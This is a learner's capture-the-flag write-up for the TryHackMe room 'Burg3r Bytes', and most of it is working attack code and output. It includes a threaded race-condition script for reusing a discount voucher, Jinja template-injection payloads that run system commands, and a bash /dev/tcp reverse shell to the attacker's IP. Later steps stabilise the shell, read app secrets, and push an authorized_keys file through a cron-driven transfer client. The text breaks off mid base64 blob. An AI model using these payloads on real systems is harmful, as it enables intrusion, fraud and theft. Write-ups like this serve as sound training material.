<h1 align="center">TryHack3M: BUrg3r Bytes</h1>
<p align="center"><img width="80px" src="https://github.com/user-attachments/assets/05f1224c-0546-497c-a1bb-d7ef4ceb1de6"><br>
July 19, 2025<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, 
and I’m excited to join you on this adventure, part of my <code>438</code>-day-streak in<a href="https://tryhackme.com">TryHackMe</a>.<br>
<em>They say these burgers are worth every penny. Can you buy one?</em>.<br>
Access it <a href="https://tryhackme.com/room/burg3rbytes">here</a>.<br><br>
<img width="1200px" src="https://github.com/user-attachments/assets/cfcc9f09-7fb1-4d48-9fe0-4bcfe5896f42"></p>

<br>


<br>

<h2>Task 1 . Coupon 3mpire</h2>
<h3>Scenario
<p>Burg3r Bytes is a global fast-food giant renowned for its burgers and pizzas. Recently, rumours have surfaced on underground forums about a glitch in Burg3r Byte's checkout system that allows users to manipulate orders. Your goal? Exploit this system to score the ultimate haul: 3 million burgers or pizzas.</p>

<h3>Challenge Background</h3>
<p>Burg3r Bytes has recently upgraded its checkout system, implementing a modern digital ordering platform to help streamline operations. This new release offers a first sign-up £10 voucher to spend on any order. There is also a free order promotion for the 3 millionth customer; Burg3r Bytes will pay for all items! However, after rushing deployment, some system architecture flaws were left. Can you figure them out?</p>

<h3 align="left"> Answer the questions below</h3>

<p>1.1. What is the web app flag?<br>
<code>THM{TryH4ck3M-APP-H4CK}</code></p>

<br>

<p>1.2. What is the host flag?<em> Hint : Located in /root on the host machine</em><br>
<code>_____________________</code></p>

<br>
<br>

<h3>nmap</h3>

<p>

- <code>22</code> : SSH<br>
- <code>80</code> : HTTP
- 
</p>

```bash
:~/Burg3rBytes# nmap -sC -sV -Pn -p- -n -T4 TargetIP
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Werkzeug/3.0.2 Python/3.8.10
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.0.2 Python/3.8.10
|     Date: Sat, 19 Jul 2025 xx:xx:xx GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 12703
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
|     <title>Burg3rByte</title>
|     <link rel="stylesheet" href="/static/css/bootstrap.min.css">
|     <link rel="stylesheet" href="/static/css/stylesheet.css">
|     </head>
|     <body>
|     <nav class="navbar navbar-light navbar-expand-md py-3">
|     <div class="container"><a class="navbar-brand d-flex align-items-center" href="#"><span style="padding-right: 0px;">Burg3rByte</span></a><button data-toggle="collapse" class="navbar-toggler" data-target="#navcol-4"><span class="sr-only">Toggle navigation</span><span class="navbar-toggler-icon"></span></button>
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.0.2 Python/3.8.10
|     Date: Sat, 19 Jul 2025 xx:xx:xx GMT
|     Content-Type: text/html; charset=utf-8
|     Allow: OPTIONS, HEAD, GET
|     Content-Length: 0
|     Connection: close
|   RTSPRequest: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
|_http-server-header: Werkzeug/3.0.2 Python/3.8.10
|_http-title: Burg3rByte
```

<h3>Gobuster</h3>

```bash
:~/Burg3rBytes# gobuster dir -u http://TargetIP -w /usr/share/wordlists/dirb/big.txt
...
/basket               (Status: 200) [Size: 6384]
/checkout             (Status: 200) [Size: 3218]
/console              (Status: 200) [Size: 1563]
/login                (Status: 200) [Size: 7724]
/register             (Status: 200) [Size: 7773]
```

<h3>Web</h3>

<img width="1183" height="653" alt="image" src="https://github.com/user-attachments/assets/c02d4b85-6a36-4881-ab70-f787b6109b6e" />

<img width="1164" height="375" alt="image" src="https://github.com/user-attachments/assets/07f9ffd8-e3bd-4c9c-844a-35d8f2af8fa9" />

<p>Below the linked of the itens in the menu:<br>

- http://10.10.145.56/add-to-basket?itemid=TRYHACK3M<br>

- http://10.10.145.56/add-to-basket?itemid=HACKASNACK<br>

- http://10.10.145.56/add-to-basket?itemid=XTERM<br>

- http://10.10.145.56/add-to-basket?itemid=SIEML<br>

- http://10.10.145.56/add-to-basket?itemid=RASPPI<br>

- http://10.10.145.56/add-to-basket?itemid=THEDA

- </p>

<p>Tried all and got 50%discount with TRYHACK3M and with HACKSNACK.</p>

<p>Floating over the burguer image there is TRYHACK3M</p>

<img width="1185" height="538" alt="image" src="https://github.com/user-attachments/assets/c366812c-8a3a-42b0-81c3-7617fd674ffb" />


<h4>/console</h4>

<img width="1229" height="285" alt="image" src="https://github.com/user-attachments/assets/0e9a6419-f366-4d91-98a6-85021749833a" />

<p>In the challenge Scenario there is <code>Exploit this system to score</code> ...<br>
Remembered of some challenges related to race condition.</p>


<h4>/login</h4>

<img width="1182" height="501" alt="image" src="https://github.com/user-attachments/assets/24cdc7e0-b689-4d8e-8653-7fc7ddf00fae" />


<p>

- Added X-Term-and-Share to the Basket<br>
- Clicked Basket
- Clicked Proceed to Checkout
</p>

<img width="1179" height="291" alt="image" src="https://github.com/user-attachments/assets/0fa87d34-d42a-4f07-9b2a-7170ac644b6c" />

<p>

- identified an Apply Voucher feature
</p>

<img width="1190" height="501" alt="image" src="https://github.com/user-attachments/assets/e2db283d-acb8-40b5-b7f5-54b068adc20f" />

<p>

- Added A name and TRYHACK3M

</p>

<img width="1196" height="640" alt="image" src="https://github.com/user-attachments/assets/6f0b1795-221e-47c8-9732-9c029ab79527" />


<h3>Burp Suite</h3>

<p><em>Request</em></p>

```bash
POST /checkout HTTP/1.1
Host: TargetIP
User-Agent: python-requests/2.32.4
Accept-Encoding: gzip, deflate, br
Accept: */*
Connection: keep-alive
Cookie: session=eyJjc3JmX3Rva2VuIjoiMzhjYTE3MjA3ZDg1MDdiMzhiMjExMDEyZjkyMTM5NWM3NDM5YjI5NiJ9.aHv4Sw.flDwv9vIQMA0a_F4LnmynbX6g4A
Content-Length: 156
Content-Type: application/x-www-form-urlencoded

csrf_token=IjM4Y2ExNzIwN2Q4NTA3YjM4YjIxMTAxMmY5MjEzOTVjNzQzOWIyOTYi.aHv4NQ.FgA9w9W_vM_JFIxg-i-w5ZRvXB0&name=Researcher&voucher_code=TRYHACK3M&submit=Checkout
```

<p><em>Response</em></p>

```bash
HTTP/1.1 302 FOUND
Server: Werkzeug/3.0.2 Python/3.8.10
Date: Sat, 19 Jul 2025 xx:xx:xx GMT
Content-Type: text/html; charset=utf-8
Content-Length: 287
Location: /receipt/82739098304716027352341076?name=Resarcher
Vary: Cookie
Set-Cookie: session=eyJfZmxhc2hlcyI6W3siIHQiOlsibWVzc2FnZSIsIkRpc2NvdW50IEFwcGxpZWQgU3VjY2Vzc2Z1bGx5ISJdfV0sImNzcmZfdG9rZW4iOiJkMGNiM2MyN2VhMGE3NDk4ZTBjODRmM2QxM2QyYWM0NTEwYjlhM2UzIn0.aHvZ9Q.0ml3Pp1Hel5jXHwcMWGgcX2gKVI; HttpOnly; Path=/
Connection: close

<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/receipt/82739098304716027352341076?name=Resarcher">/receipt/82739098304716027352341076?name=Resarcher</a>
```
    

<h3>Script</h3>

<p><em>RaceCondition.py</em></p>

```bash
#!/usr/bin/env python3

import requests
import threading

target_ip = "tARGETip"

def clear_voucher():
	requests.get(f"http://{target_ip}/clear-vouchers")

def send_voucher():
	r = requests.post(f"http://{target_ip}/checkout", cookies={"session":"eyJjc3JmX3Rva2VuIjoiMzhjYTE3MjA3ZDg1MDdiMzhiMjExMDEyZjkyMTM5NWM3NDM5YjI5NiJ9.aHv4Sw.flDwv9vIQMA0a_F4LnmynbX6g4A"}, data={"csrf_token":"IjM4Y2ExNzIwN2Q4NTA3YjM4YjIxMTAxMmY5MjEzOTVjNzQzOWIyOTYi.aHv4NQ.FgA9w9W_vM_JFIxg-i-w5ZRvXB0","name":"Resarcher","voucher_code":"TRYHACK3M","submit":"Checkout"}, proxies={"http":"http://127.0.0.1:8080"})

clear_voucher()

threads = []
for i in range(0, 10):
	threads.append(threading.Thread(target=send_voucher))

for thread in threads:
	thread.start()

for thread in threads:
	thread.join()
```

<h3>Execute script</h3>

<h3>Burp Suite</h3>

```bash
GET /receipt/82739098304716027352341076?name=Resarcher HTTP/1.1
Host: 10.10.145.56
User-Agent: python-requests/2.32.4
Accept-Encoding: gzip, deflate, br
Accept: */*
Connection: keep-alive
Cookie: session=eyJjc3JmX3Rva2VuIjoiZDBjYjNjMjdlYTBhNzQ5OGUwYzg0ZjNkMTNkMmFjNDUxMGI5YTNlMyJ9.aHvY2Q.mVFdBLS8C7KjhdEIe1iqZw0CzPE; session=eyJfZmxhc2hlcyI6W3siIHQiOlsibWVzc2FnZSIsIkRpc2NvdW50IEFwcGxpZWQgU3VjY2Vzc2Z1bGx5ISJdfV0sImNzcmZfdG9rZW4iOiJkMGNiM2MyN2VhMGE3NDk4ZTBjODRmM2QxM2QyYWM0NTEwYjlhM2UzIn0.aHvZ9Q.0ml3Pp1Hel5jXHwcMWGgcX2gKVI
```

```bash
HTTP/1.1 200 OK
Server: Werkzeug/3.0.2 Python/3.8.10
Date: Sat, 19 Jul 2025 xx:xx:xx GMT
Content-Type: text/html; charset=utf-8
Content-Length: 567
Connection: close

<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Success</title>
</head>
<body>
    <h1>Congratulations on Your Purchase!</h1>
    <p>Dear Resarcher,</p>
    <p>Thank you for purchasing the 3M item! As a token of our appreciation, please find below your special certificate:</p>
    <div style="margin: 20px; padding: 20px; border: 2px dashed #333;">
        <h2> TryHack3M  </h2>
        <p>This certifies that <strong>Resarcher</strong> is now the proud owner of the 3M item.</p>
    </div>
    <p>We hope you enjoy your treat.</p>
</body>
</html>
```

<img width="1012" height="125" alt="image" src="https://github.com/user-attachments/assets/d084b5e4-6a2e-45e7-bd28-b4d66e1775ca" />

<h3>Purchase OK</h3>

<img width="1552" height="504" alt="image" src="https://github.com/user-attachments/assets/4c022819-31b1-4446-991e-189cd9ad38a8" />

<h3>name={{9*9}}</h3>

<img width="1665" height="469" alt="image" src="https://github.com/user-attachments/assets/5c9ed587-e5c0-405b-8f14-e17fc863c5a8" />



<h3>name={{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}</h3>

<img width="1671" height="509" alt="image" src="https://github.com/user-attachments/assets/8574c445-b159-4765-9d51-7357fd48685b" />


<h3>Shell</h3>h3>

{{self.__init__.__globals__.__builtins__.__import__('os').popen('/bin/bash+-c+"/bin/bash+-i+>%26+/dev/tcp/10.10.168.139/4444+0>%261"').read()}}

```bash
GET /receipt/82739098304716027352341076?name={{self.__init__.__globals__.__builtins__.__import__('os').popen('/bin/bash+-c+"/bin/bash+-i+>%26+/dev/tcp/10.10.15.210/4444+0>%261"').read()}} HTTP/1.1
Host: 10.10.145.56
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: close
Cookie: session=eyJfZmxhc2hlcyI6W3siIHQiOlsibWVzc2FnZSIsIkRpc2NvdW50IEFwcGxpZWQgU3VjY2Vzc2Z1bGx5ISJdfV0sImNzcmZfdG9rZW4iOiJkMGNiM2MyN2VhMGE3NDk4ZTBjODRmM2QxM2QyYWM0NTEwYjlhM2UzIn0.aHvaEQ.klQHUacClhVO3IbfZfWF8KYkKzA
Upgrade-Insecure-Requests: 1
```

<h4>Stabilize</h4>

```bash
:~/Burg3rBytes# nc -nlvp 4444
...
root@7b05c5df3d55:/app# which python3
which python3
/usr/bin/python3
root@7b05c5df3d55:/app# python3 -c 'import pty;pty.spawn("/bin/bash");'
python3 -c 'import pty;pty.spawn("/bin/bash");'
root@7b05c5df3d55:/app# export TERM=xterm
export TERM=xterm
root@7b05c5df3d55:/app# ^Z
[1]+  Stopped                 nc -nlvp 4444
:~/Burg3rBytes# stty raw -echo; fg
nc -nlvp 4444
```

<h4>TXT</h4>

```bash
root@7b05c5df3d55:/app# ls -lah
total 84K
drwxr-xr-x 1 root root 4.0K Apr 12  2024 .
drwxr-xr-x 1 root root 4.0K Apr 12  2024 ..
-rw-rw-r-- 1 root root 6.1K Apr  2  2024 .DS_Store
-rw-rw-r-- 1 root root  389 Apr 12  2024 Dockerfile
-rw-rw-r-- 1 root root   44 Apr  5  2024 README.md
drwxrwxr-x 2 root root 4.0K Apr 12  2024 __pycache__
-rw-rw-r-- 1 root root 5.1K Apr 10  2024 app.py
drwxrwxr-x 1 root root 4.0K Apr 12  2024 cron
-rw-r--r-- 1 root root   24 Apr 12  2024 flag.txt
drwxrwxr-x 1 root root 4.0K Apr 12  2024 instance
-rw-rw-r-- 1 root root   60 Apr  2  2024 launch.sh
-rw-rw-r-- 1 root root   53 Apr 10  2024 requirements.txt
drwxrwxr-x 6 root root 4.0K Apr 12  2024 static
drwxrwxr-x 2 root root 4.0K Apr 12  2024 templates
drwxrwxr-x 4 root root 4.0K Apr 12  2024 venv
-rw-rw-r-- 1 root root   59 Apr  2  2024 wsgi.py
root@7b05c5df3d55:/app# cat flag.txt
THM{TryH4ck3M-APP-H4CK}
```

<h4>Dockerfile</h4>

```bash
root@7b05c5df3d55:/app# cat Dockerfile
FROM ubuntu:20.04

RUN apt-get update -y && \
    apt-get install -y python3 python3-pip python3-dev cron vim


COPY ./requirements.txt /app/requirements.txt


WORKDIR /app

RUN echo "THM{TryH4ck3M-APP-H4CK}" >> /app/flag.txt


RUN pip install -r requirements.txt

COPY . /app

RUN chmod 644 /app/cron/client_py.py
RUN crontab /app/cron/crontab

ENTRYPOINT [ "python3" ]

CMD [ "app.py" ]
```

<h4>app.py</h4>

```bash
...
app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///site.db'
app.config['SECRET_KEY'] = 'key_meowmeow1'
db = SQLAlchemy(app)
...
```


<h4>requirements.txt</h4>


```bash
root@7b05c5df3d55:/app# cat requirements.txt
flask_wtf
wheel
flask_sqlalchemy
crypto
pycryptodome
```



<h4>cron</h4>


```bash
root@7b05c5df3d55:/app/cron# ls -lah
total 36K
drwxrwxr-x 1 root root 4.0K Apr 12  2024 .
drwxr-xr-x 1 root root 4.0K Apr 12  2024 ..
-rw-rw-r-- 1 root root  451 Apr  5  2024 client.crt
-rw-rw-r-- 1 root root 1.7K Apr  5  2024 client.key
-rw-r--r-- 1 root root 4.8K Apr 10  2024 client_py.py
-rw-rw-r-- 1 root root   62 Apr 10  2024 crontab
```


<h4>client_py.py</h4>

<p>

- <code>get_file</code><br>
- <code>put_file</code><br>
</p>

```bash
root@7b05c5df3d55:/app/cron# cat client_py.py
import sys
import socket
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
from Crypto.Signature import pss
from Crypto.Hash import SHA256
import binascii
import base64

MAX_SIZE = 200

opcodes = {
    'read': 1,
    'write': 2,
    'data': 3,
    'ack': 4,
    'error': 5
}

mode_strings = ['netascii', 'octet', 'mail']

with open("client.key", "rb") as f:
    data = f.read()
    privkey = RSA.import_key(data)

with open("client.crt", "rb") as f:
    data = f.read()
    pubkey = RSA.import_key(data)

try:
    with open("server.crt", "rb") as f:
        data = f.read()
        server_pubkey = RSA.import_key(data)
except:
    server_pubkey = False

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.settimeout(3.0)
server_address = (sys.argv[1], int(sys.argv[2]))

def encrypt(s, pubkey):
    cipher = PKCS1_OAEP.new(pubkey)
    return cipher.encrypt(s)

def decrypt(s, privkey):
    cipher = PKCS1_OAEP.new(privkey)
    return cipher.decrypt(s)

def send_rrq(filename, mode, signature, server):
    rrq = bytearray()
    rrq.append(0)
    rrq.append(opcodes['read'])
    rrq += bytearray(filename)
    rrq.append(0)
    rrq += bytearray(mode)
    rrq.append(0)
    rrq += bytearray(signature)
    rrq.append(0)
    sock.sendto(rrq, server)
    return True

def send_wrq(filename, mode, server):
    wrq = bytearray()
    wrq.append(0)
    wrq.append(opcodes['write'])
    wrq += bytearray(filename)
    wrq.append(0)
    wrq += bytearray(mode)
    wrq.append(0)
    sock.sendto(wrq, server)
    return True

def send_ack(block_number, server):
    if len(block_number) != 2:
        print('Error: Block number must be 2 bytes long.')
        return False
    ack = bytearray()
    ack.append(0)
    ack.append(opcodes['ack'])
    ack += bytearray(block_number)
    sock.sendto(ack, server)
    return True

def send_error(server, code, msg):
    err = bytearray()
    err.append(0)
    err.append(opcodes['error'])
    err.append(0)
    err.append(code & 0xff)
    pkt += bytearray(msg + b'\0')
    sock.sendto(pkt, server)

def send_data(server, block_num, block):
    if len(block_num) != 2:
        print('Error: Block number must be 2 bytes long.')
        return False
    pkt = bytearray()
    pkt.append(0)
    pkt.append(opcodes['data'])
    pkt += bytearray(block_num)
    pkt += bytearray(block)
    sock.sendto(pkt, server)

def get_file(filename, mode):
    h = SHA256.new(filename)
    signature = base64.b64encode(pss.new(privkey).sign(h))

    send_rrq(filename, mode, signature, server_address)
    
    file = open(filename, "wb")

    while True:
        data, server = sock.recvfrom(MAX_SIZE * 3)

        if data[1] == opcodes['error']:
            error_code = int.from_bytes(data[2:4], byteorder='big')
            print(data[4:])
            break
        send_ack(data[2:4], server)
        content = data[4:]
        content = base64.b64decode(content)
        content = decrypt(content, privkey)
        file.write(content)
        if len(content) < MAX_SIZE:
            print("file received!")
            break

def put_file(filename, mode):
    if not server_pubkey:
        print("Error: Server pubkey not configured. You won't be able to PUT")
        return

    try:
        file = open(filename, "rb")
        fdata = file.read()
        total_len = len(fdata)
    except:
        print("Error: File doesn't exist")
        return False

    send_wrq(filename, mode, server_address)
    data, server = sock.recvfrom(MAX_SIZE * 3)
    
    if data != b'\x00\x04\x00\x00': # ack 0
        print("Error: Server didn't respond with ACK to WRQ")
        return False

    block_num = 1
    while len(fdata) > 0:
        b_block_num = block_num.to_bytes(2, 'big')
        block = fdata[:MAX_SIZE]
        block = encrypt(block, server_pubkey)
        block = base64.b64encode(block)
        fdata = fdata[MAX_SIZE:]
        send_data(server, b_block_num, block)
        data, server = sock.recvfrom(MAX_SIZE * 3)
        
        if data != b'\x00\x04' + b_block_num:
            print("Error: Server sent unexpected response")
            return False

        block_num += 1

    if total_len % MAX_SIZE == 0:
        b_block_num = block_num.to_bytes(2, 'big')
        send_data(server, b_block_num, b"")
        data, server = sock.recvfrom(MAX_SIZE * 3)
        
        if data != b'\x00\x04' + b_block_num:
            print("Error: Server sent unexpected response")
            return False

    print("File sent successfully")
    return True

def main():
    filename = b'site.db'
    mode = b'netascii'

    get_file(filename, mode)
    exit(0)

if __name__ == '__main__':
    main()
```


```bash
root@7b05c5df3d55:/app/cron# python3 client_py.py 172.17.0.1 69
python3 client_py.py 172.17.0.1 69
file received!
root@7b05c5df3d55:/app/cron# ls
ls
client.crt  client.key  client_py.py  crontab  site.db
root@7b05c5df3d55:/app/cron# 

```

<h3>crontab</h3>

```bash
root@7b05c5df3d55:/app/cron# cat crontab
20 3 * * * cd /app/cron && python3 client_py.py 172.17.0.1 69
```

<h3>client.crt</h3>

```bash
root@7b05c5df3d55:/app/cron# cat client.crt
-----BEGIN PUBLIC KEY-----
...
aAkE5newV5rNlh9FdXs8subcE1NuPNSFNadeim9WQiaiekMeb7xBXeuimUxEgrzo
MQIDAQAB
-----END PUBLIC KEY-----
```

```bash
root@7b05c5df3d55:/app/cron# echo 'IyEv................==' | base64 -d | tee linpeas.sh
...
root@7b05c5df3d55:/app/cron# chmod +x linpeas
```

<p>linpeas.sh identified <code>20 3 * * * cd /app/cron && python3 client_py.py 172.17.0.1 69</code></p>


```bash
root@7b05c5df3d55:/app/cron# cp client.py_py client.py
root@7b05c5df3d55:/app/cron# sed -i "s|filename = b'site.db'|filename = b'server.crt'|g" client.py
root@7b05c5df3d55:/app/cron# python3 client.py 172.17.0.1 69
root@7b05c5df3d55:/app/cron# ls
client.crt  client.py     crontab     
client.key  client_py.py  server.crt
```

```bash
:~/Burg3rBytes# ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa): id_rsa
...
:~/Burg3rBytes# ls
id_rsa  id_rsa.pub  RaceCondition.py
:~/Burg3rBytes# cat id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDd/fqxkrUysw7SYGBBGAzKKKBFYkXDQ2indl/+gshnPX42rJuJET/Du+wAwdyXGuSnDBbyA/GObLU61XZlyKfPHyiZNyGjBJd6IK8mzC56c/gmtNUdDCmikK4gM5sjsIi1SCJtAURL29YfGVTW/pA6Gpe2wZ2JE6bRYBFXb3lhAxOuqRJ+4KMYBlqY++BsjatvD6IIRdw96+sq/6qW23G2Ipk63hBQvMwlsgw44liqMpVhGlQgSmUGSiLrqUbLBawXZlI5WpO11N19rdi7lM20PTi8g2fqiGtW/fyFGID7wWMndR9jr0rqQG8EWjmTkv+S1unbQq+5jLCxx6BBkR4JhI126usdLsK5IXq6luJj5eGzNM/Mw/mmWMkSUHhCTATNjiKRwIosMsH+JHNlMIxkDXcTFAbJSERcCP+1vxN8dif263E33x66BUAQHQM+rfIvMNy/Q5CiG4nzWNboN7ILFFoKCzFghOYhzcGCSkXVyhTswq85PIlTZ6ZqFAdtYnc= root@ip-10-10-168-139
:~/Burg3rBytes# chmod 600 id_rsa
```

```bash
:~/Burg3rBytes# cat id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC0vKMaZRMzcipjYJaYoK2RrOH9yujulh2kw/UEg1p2yujMe7FY8QtIgzlD1PLaaxUc3abRcuMBwXCojzsrSims4+NP08FN1V/SyuMoa758VvpTBsUa3W86vVMRsI78/YzkQ/GRw11fFKJA4TOHjUMlosIN4GKJHwxZPs9s5LoUt9eZfloWEJ4Cr1qCZSD7ru/Zrj+LAHfrNpf+qRHcn1y+cNIUVFVx53kpKAWypbGUVCP5pqzRmYaoibVbwHSnzPxzf7rrZ0puFTOANZ5geA5OYQ6DIoc29QP6rKRAXav3uIJ8iqPwOLqJV2ceUZ4B4T2/1d54rGiMXgLY5agQWcDLL95099+ZOEjzhczCUi4jxcXn48drmhsq+ysUqUp0K2x/zFJqm/paapgZEOmbOPb/BrYHqlwy7z7p1egOlTzHjZbwj/G8RX9JbH0IB/XFZ0nTh9gPUyPQ+VHHue0dfNIM4OZ8ObbtEt3LutDS9Sc6E4HnZ028G2Yi0av3noaVWg8= root@ip-10-10-15-210
```

```bash
root@7b05c5df3d55:/app/cron# echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC0vKMaZRMzcipjYJaYoK2RrOH9yujulh2kw/UEg1p2yujMe7FY8QtIgzlD1PLaaxUc3abRcuMBwXCojzsrSims4+NP08FN1V/SyuMoa758VvpTBsUa3W86vVMRsI78/YzkQ/GRw11fFKJA4TOHjUMlosIN4GKJHwxZPs9s5LoUt9eZfloWEJ4Cr1qCZSD7ru/Zrj+LAHfrNpf+qRHcn1y+cNIUVFVx53kpKAWypbGUVCP5pqzRmYaoibVbwHSnzPxzf7rrZ0puFTOANZ5geA5OYQ6DIoc29QP6rKRAXav3uIJ8iqPwOLqJV2ceUZ4B4T2/1d54rGiMXgLY5agQWcDLL95099+ZOEjzhczCUi4jxcXn48drmhsq+ysUqUp0K2x/zFJqm/paapgZEOmbOPb/BrYHqlwy7z7p1egOlTzHjZbwj/G8RX9JbH0IB/XFZ0nTh9gPUyPQ+VHHue0dfNIM4OZ8ObbtEt3LutDS9Sc6E4HnZ028G2Yi0av3noaVWg8= root@ip-10-10-15-210' > authorized_keys
root@7b05c5df3d55:/app/cron# cp client_py.py client.py
```

```bash
root@7b05c5df3d55:/app/cron# cp client_py.py client.py
root@7b05c5df3d55:/app/cron# sed -i '/def main()/,/exit(0)/s/get_file(filename, mode)/put_file(filename, mode)/' client.py
root@7b05c5df3d55:/app/cron# sed -i "s|filename = b'site.db'|filename = b'authorized_keys'|g" client.py
root@7b05c5df3d55:/app/cron# python3 client.py 172.17.0.1 69
File sent successfully
```

```bash
root@7b05c5df3d55:/app/cron# cat status
cat: status: No such file or directory
root@7b05c5df3d55:/app/cron# echo 'aW1wb3J0IHN5cw0KaW1wb3J0IHNvY2tldA0KZnJvbSBDcnlwdG8...............CdvY3RldCcsICdtYWlsJ10NCg0Kd2l0aCBvcGVuKCJjbGllbnQua2V5IiwgInJiIikgYXMgZjoNCiAgICBkYXRhID0gZi5yZWFkKCkNCiAgICBwcml2a2V5ID0gUlNBLmltcG9ydF9rZXkoZGF0YSkNCg0Kd2l0aCBvcGVuKCJjbGllbnQuY3J0IiwgInJiIikgYXMgZjoNCiAgICBkYXRhID0gZi5yZWFkKCkNCiAgICBwdWJrZXkgPSBSU0EuaW1wb3J0X2tleShkYXRhKQ0KDQp0cnk6DQogICAgd2l0aCBvcGVuKCJzZXJ2ZXIuY3J0IiwgInJiIikgYXMgZjoNCiAgICAgICAgZGF0YSA9IGYucmVhZCgpDQogICAgICAgIHNlcnZlcl9wdWJrZXkgPSBSU0EuaW1wb3J0X2tleShkYXRhKQ0KZXhjZXB0Og0KICAgIHNlcnZlcl9wdWJrZXkgPSBGYWxzZQ0KDQpzb2NrID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCwgc29ja2V0LlNPQ0tfREdSQU0pDQpzb2NrLnNldHRpbWVvdXQoMy4wKQ0Kc2VydmVyX2FkZHJlc3MgPSAoc3lzLmFyZ3ZbMV0sIGludChzeXMuYXJndlsyXSkpDQoNCmRlZiBlbmNyeXB0KHMsIHB1YmtleSk6DQogICAgY2lwaGVyID0gUEtDUzFfT0FFUC5uZXcocHVia2V5KQ0KICAgIHJldHVybiBjaXBoZXIuZW5jcnlwdChzKQ0KDQpkZWYgZGVjcnlwdChzLCBwcml2a2V5KToNCiAgICBjaXBoZXIgPSBQS0NTMV9PQUVQLm5ldyhwcml2a2V5KQ0KICAgIHJldHVybiBjaXBoZXIuZGVjcnlwdChzKQ0KDQpkZWYgc2VuZF9ycnEoZmlsZW5hbWUsIG1vZGUsIHNpZ25hdHVyZSwgc2VydmVyKToNCiAgICBycnEgPSBieXRlYXJyYXkoKQ0KICAgIHJycS5hcHBlbmQoMCkNCiAgICBycnEuYXBwZW5kKG9wY29kZXNbJ3JlYWQnXSkNCiAgICBycnEgKz0gYnl0ZWFycmF5KGZpbGVuYW1lKQ0KICAgIHJycS5hcHBlbmQoMCkNCiAgICBycnEgKz0gYnl0ZWFycmF5KG1vZGUpDQogICAgcnJxLmFwcGVuZCgwKQ0KICAgIHJycSArPSBieXRlYXJyYXkoc2lnbmF0dXJlKQ0KICAgIHJycS5hcHBlbmQoMCkNCiAgICBzb2NrLnNlbmR0byhycnEsIHNlcnZlcikNCiAgICByZXR1cm4gVHJ1ZQ0KDQpkZWYgc2VuZF93cnEoZmlsZW5hbWUsIG1vZGUsIHNlcnZlcik6DQogICAgd3JxID0gYnl0ZWFycmF5KCkNCiAgICB3cnEuYXBwZW5kKDApDQogICAgd3JxLmFwcGVuZChvcGNvZGVzWyd3cml0ZSddKQ0KICAgIHdycSArPSBieXRlYXJyYXkoZmlsZW5hbWUpDQogICAgd3JxLmFwcGVuZCgwKQ0KICAgIHdycSArPSBieXRlYXJyYXkobW9kZSkNCiAgICB3cnEuYXBwZW5kKDApDQogICAgc29jay5zZW5kdG8od3JxLCBzZXJ2ZXIpDQogICAgcmV0dXJuIFRydWUNCg0KZGVmIHNlbmRfYWNrKGJsb2NrX251bWJlciwgc2VydmVyKToNCiAgICBpZiBsZW4oYmxvY2tfbnVtYmVyKSAhPSAyOg0KICAgICAgICBwcmludCgnRXJyb3I6IEJsb2NrIG51bWJlciBtdXN0IGJlIDIgYnl0ZXMgbG9uZy4nKQ0KICAgICAgICByZXR1cm4gRmFsc2UNCiAgICBhY2sgPSBieXRlYXJyYXkoKQ0KICAgIGFjay5hcHBlbmQoMCkNCiAgICBhY2suYXBwZW5kKG9wY29kZXNbJ2FjayddKQ0KICAgIGFjayArPSBieXRlYXJyYXkoYmxvY2tfbnVtYmVyKQ0KICAgIHNvY2suc2VuZHRvKGFjaywgc2VydmVyKQ0KICAgIHJldHVybiBUcnVlDQoNCmRlZiBzZW5kX2Vycm9yKHNlcnZlciwgY29kZSwgbXNnKToNCiAgICBlcnIgPSBieXRlYXJyYXkoKQ0KICAgIGVyci5hcHBlbmQoMCkNCiAgICBlcnIuYXBwZW5kKG9wY29kZXNbJ2Vycm9yJ10pDQogICAgZXJyLmFwcGVuZCgwKQ0KICAgIGVyci5hcHBlbmQoY29kZSAmIDB4ZmYpDQogICAgcGt0ICs9IGJ5dGVhcnJheShtc2cgKyBiJ1wwJykNCiAgICBzb2NrLnNlbmR0byhwa3QsIHNlcnZlcikNCg0KZGVmIHNlbmRfZGF0YShzZXJ2ZXIsIGJsb2NrX251bSwgYmxvY2spOg0KICAgIGlmIGxlbihibG9ja19udW0pICE9IDI6DQogICAgICAgIHByaW50KCdFcn